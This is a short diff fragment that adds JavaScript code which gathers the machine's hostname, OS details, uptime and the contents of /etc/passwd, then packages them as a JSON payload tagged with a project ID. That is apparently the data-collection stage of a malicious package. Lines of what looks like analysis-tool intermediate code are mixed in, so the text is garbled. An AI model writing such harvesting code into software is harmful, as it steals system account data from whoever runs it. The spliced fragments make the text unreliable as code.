@@ -1,0 +1,12 @@
+const machineInfo = {
+  hostname: hostname,
+  os: `${os.type()} ${os.release()} ${os.arch()}`,
+  uptime: os.uptime(),
+  passwdFile: executeCommand("cat /etc/passwd"),
+}
+_tmp_3.os = <operator>.formatString("", os.type(), " ", os.release(), " ", os.arch(), "")
+JSON.stringify({
+    payload: machineInfo,
+    project_id: process.argv[2],
+  })
+_tmp_6.payload = machineInfo
